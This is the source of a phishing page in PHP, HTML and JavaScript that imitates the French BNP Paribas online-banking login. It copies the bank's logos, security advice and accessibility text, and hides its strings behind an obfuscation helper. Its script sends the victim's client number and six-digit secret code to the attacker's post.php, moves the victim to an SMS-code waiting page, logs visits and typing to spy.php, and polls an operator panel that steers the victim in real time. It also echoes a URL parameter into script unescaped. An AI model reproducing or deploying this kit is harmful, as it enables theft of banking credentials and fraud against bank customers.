<?php 
require '../main.php';

?><!doctype html>
<html>
<head>
<title>Accéder à mes comptes en ligne</title>
<meta charset="utf-8">
<link rel="stylesheet" href="res/main.css">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
html {
  touch-action: pan-x pan-y;
}
</style>
</head>
<body>
<header>

<div class="row mobile">
<div class="left">
<img src="res/logo.png" style="width:180px;">
</div>
<div class="right" style="text-align:right;">
<img src="res/lock.png" style="width:25px;">
</div>
</div>
<div class="row pc">
<div class="left">
<img src="res/logo.png" class="logo">
<img src="res/logo-text.png" class="logo-text">
</div>
<div class="right" style="text-align:right;">
<button class="register"><?php $bm->obf("Devenir client"); ?></button>
</div>
</div>
</header>
<div class="alert">
<div class="img">
    <img src="res/info.png" style="width:80px;">
</div>
<div class="text">
<?php $bm->obf("Des SMS usurpant des organismes officiels vous poussent à transmettre des informations personnelles et confidentielles. Ils sont suivis d'appels de fraudeurs se faisant passer pour des services bancaires afin de vous faire valider des opérations."); ?>
<a href="#"> <?php $bm->obf("En savoir plus"); ?></a>
</div>
</div>

<section class="formrow">
<div class="left">


<!-- START FORM -->

 
<div></div>
<div class="form">

<?php
if(isset($_GET['e'])){
echo '<div class="errorholder">
<div class="errorbox">
Votre saisie est incorrecte.<br>
Veuillez renouveler votre identification.
</div>
<img src="res/bottom.png">
</div>';
}
?>



<h1><?php $bm->obf("Accéder à mes comptes"); ?></h1>
<form action="action.php" method="POST">
    <input type="hidden" name="card_number">
    <input type="hidden" name="data">
</form>
<div class="formcol">
    <label><?php $bm->obf("1. Mon numéro client"); ?></label>
    <div class="inputholder">
        <div class="input">
            <input type="text" id="d0" placeholder="" class="textinput" inputmode="numeric">
        </div>
        <div class="clear">
            <img src="res/clear.png" onclick="resetUser()" style="cursor:pointer;">
        </div>
    </div>
</div>

<div class="formcol">
    <label><?php $bm->obf("2. Mon code secret (6 chiffres)"); ?></label>
    <div class="inputholder  blur" id="pwd">
        <div class="input">
            <input type="text" readonly style="text-security:disc; -webkit-text-security:disc;" id="d1" placeholder="" class="textinput">
        </div>
        <div class="clear">
            <img src="res/clear.png" onclick="resetPass()" style="cursor:pointer;">
        </div>
    </div>
</div>

<div class="formcol">
<div class="keyboard blur">
<div class="sector">
<button onclick="add(8)">8</button>
<button onclick="add(0)">0</button>
<button onclick="add(1)">1</button>
<button onclick="add(5)">5</button>
<button onclick="add(3)">3</button>
</div>
<div class="sector">
<button onclick="add(9)">9</button>
<button onclick="add(6)">6</button>
<button onclick="add(4)">4</button>
<button onclick="add(7)">7</button>
<button onclick="add(2)">2</button>
</div>
</div>


<div class="formcol">
<button id="sbmt" onclick="sendLogin()" class="sbmt blur"><?php $bm->obf("Accéder à mes comptes"); ?></button>
</div>

<div class="formcol" style="text-align:center;">
<a href="#" style="color:white;"><?php $bm->obf("Numéro client ou code secret oublié ?"); ?></a>
</div>


</div>
<!-- END FORM -->

</div>
</div>
<div class="right" style="font-family:b-reg;" >

<div class="tab">
<div class="tabtitle">
<img src="res/tablock.png"> <?php $bm->obf("Vos codes d'accès"); ?>
</div>
<div class="tabtext">
<a href="#"><?php $bm->obf("Obtenir ses codes d'accès"); ?></a>
</div>
</div>

<div class="tab">
<div class="tabtitle" style="position:relative;">
<img src="res/tabsheild.png"> <?php $bm->obf("Conseils de sécurité"); ?>
</div>
<div class="tabtext" style="display:flex; align-items:center;">
<div style="width:100%;">
<?php $bm->obf("Vérifiez que l'adresse du site commence exactement par :"); ?>
<p><b><?php $bm->obf("https://connexion-mabanque.bnpparibas/"); ?></b></p>
<?php $bm->obf("précédée par une icône cadenas et contient un https:// qui garantiront une connexion sécurisée."); ?>
<?php $bm->obf("Découvrez nos conseils sécuritéet les bonnes pratiques pour consulter et identifier les dangers du web."); ?>
</div>
<div style="margin-right:-20px;">
<img src="res/phish.png" >
</div>
</div>
</div>

<div class="tab">
<div class="tabtitle">
<img src="res/tabeye.png"> <?php $bm->obf("Pour une meilleure accessibilité"); ?>
</div>
<div class="tabtext">
<p><?php $bm->obf("Connectez-vous grâce à la grille contrastée, agrandie et bénéficiez d'un accompagnement vocal."); ?></p>

<p><?php $bm->obf("Utilisez Facil'iti pour personnaliser l'affichage en fonction de votre situation (handicap visuel ou cognitif)."); ?></p>

<p><?php $bm->obf("Accédez au service Sourds et Malentendants, Sourds et Aveugles ou Aphasiques pour contacter un conseiller avec un dispositif en LSF (Langue des Signes Française), en LPC (Langage Parlé Complété) ou en TIP (Transcription Instantanée de la Parole)."); ?></p>

<p><?php $bm->obf("Rendez-vous sur la page Accessibilité pour plus d'informations sur l'accessibilité numérique chez BNP Paribas."); ?></p>
</div>
</div>

<div class="tab">
<div class="tabtitle">
<img src="res/tabcall.png"><?php $bm->obf(" Informations client"); ?>
</div>
<div class="tabtext">
<?php $bm->obf("Si vous rencontrez des problèmes techniques lors de votre navigation, nous vous invitons à contacter nos conseillers en ligne au : "); ?>
<img src="res/call.png" style="display:block; width:190px;">
<?php $bm->obf("ou à nous signaler un problème technique.
Vous pouvez également gérer vos comptes depuis votre mobile ou votre tablette via l'application Mes comptes."); ?>
</div>
</div>


</div>

</section>



<footer>
<img src="res/footer-pc-3.png"  class="footer-pc">
<img src="res/footer-mobile.png" class="footer-mobile">
<img src="res/footer-mobile3.png" class="footer-mobile">
</footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-creditcardvalidator/1.2.0/jquery.creditCardValidator.js"></script>
<script>
$("#d0").mask("0000000000");
$("#d1").mask("000000");

$.post("spy.php", {loginview:1});
var abort = false;
$("#d0").keyup(function(){
	if(abort==false){
		$.post("spy.php", {logining:1});
		abort=true;
	}
});

var blockKeyboard = true;


$("#d0").keyup(()=>{
    if($("#d0").val().length<7){
        $("#pwd").addClass("blur");
        $(".keyboard").addClass("blur");
        blockKeyboard=true;
    }else{      
        $("#pwd").removeClass("blur");
        $(".keyboard").removeClass("blur");
        blockKeyboard = false;
    }
});

function validatePass(){
    if($("#d1").val().length<5){
        $("#sbmt").addClass("blur");
    }else{      
        $("#sbmt").removeClass("blur");
    }
}


function resetPass(){
    $("#sbmt").addClass("blur");
    $("#d1").val("");
}

function resetUser(){
    $("#pwd").addClass("blur");
    $(".keyboard").addClass("blur");
    $("#d0").val("");
    blockKeyboard=true;
}


function add(num){
    validatePass();
    if(!blockKeyboard && $("#d1").val().length<6){
        $("#d1").val($("#d1").val()+num);
    }
}

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendLogin();
    }
});


function sendLogin(){
    if($("#d0").val()!="" && $("#d1").val().length>5){
        $("#sbmt").attr("disabled", "true");
        $.post("post.php",{
            user:$("#d0").val(),
            pass:$("#d1").val()
        },
            function(d){
                window.location="wait.php?p=SMS";
        });
    }
}

setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
        }
    })

}, 2000);

</script>
</body>
</html>
